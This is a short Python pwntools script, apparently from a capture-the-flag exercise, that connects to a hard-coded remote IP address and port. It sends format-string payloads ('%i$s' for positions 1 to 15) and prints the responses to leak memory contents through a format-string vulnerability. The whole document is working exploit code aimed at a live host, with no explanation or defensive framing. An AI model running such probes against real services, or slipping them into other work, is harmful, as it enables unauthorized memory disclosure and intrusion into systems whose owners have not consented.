from pwn import *
host = "51.77.140.155"
port = 1339
for i in range(1, 16):
    try:
        #p = process("./main")
        p = remote(host, port)
        payload = f'%{i}$s\n'
        p.sendline(payload.encode())
        response = p.recvall().decode().strip()
        print(f"Position {i:2}: {response}")
        p.close()
    except Exception as e:
        print(f"Error testing position {i}: {str(e)}")
